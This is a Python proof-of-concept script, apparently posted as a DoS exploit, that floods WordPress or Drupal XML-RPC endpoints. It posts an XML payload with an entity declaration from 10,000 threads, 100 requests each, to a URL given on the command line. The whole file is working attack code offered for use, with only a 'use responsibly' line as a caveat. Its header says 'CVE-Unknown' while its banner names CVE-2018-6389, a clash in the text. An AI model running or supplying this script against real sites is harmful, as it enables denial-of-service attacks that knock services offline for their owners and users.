#!/usr/bin/env python3
#################################################################################
# CVE-Unknown Wordpress and Drupal XML Blowup Attack DoS
# Author: Nahid
# This is a Proof of Concept Exploit, Please use responsibly.
#################################################################################

def banner():
    grey = "\033[1;30m"
    red = "\033[1;31m"
    yellow = "\033[1;33m"
    green = "\033[1;32m"
    default = "\033[0m"

    width = 56
    print("+--------------------------------------------------------+")
    print(f"|   {grey}{'xmlrpc-ddos':<{width}}{default} |")
    print(f"|   {yellow}{'CVE-2018-6389':<{width}}{default} |")
    print(f"|   {red}{'Author: Nahid':<{width}}{default} |")
    print(f"|   {red}{'Link  : https://fumioryoto.github.io':<{width}}{default} |")
    print(f"|   {red}{'Usage : python xmlrpcdos.py <url>':<{width}}{default} |")
    print("+--------------------------------------------------------+")


import threading
import time
import urllib.request

# Define the XML data as bytes
data = b"""<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE lolz [
 <!ENTITY poc "aaaaaaaaaaaaa">
]>
<methodCall>
  <methodName>aaa&poc;</methodName>
  <params>
   <param><value>aa</value></param>
   <param><value>aa</value></param>
  </params>
</methodCall>"""

import sys

if len(sys.argv) != 2:
    print("Usage: python xmlrpcdos.py <url>")
    sys.exit(1)

target_url = sys.argv[1]
req = urllib.request.Request(target_url, data=data)

req.add_header('Accept', '*/*')
req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
req.add_header('Connection', '')
req.add_header('Content-type', 'text/xml')


class MyThread(threading.Thread):
    def run(self):
        print("{} started!".format(self.getName()))
        for _ in range(100):
            response = urllib.request.urlopen(req)
        time.sleep(0.2)
        print("{} finished!".format(self.getName()))


if __name__ == '__main__':
    banner()
    for x in range(10000):
        thread = MyThread(name="Thread-{}".format(x + 1))
        thread.start()
        time.sleep(0.1)
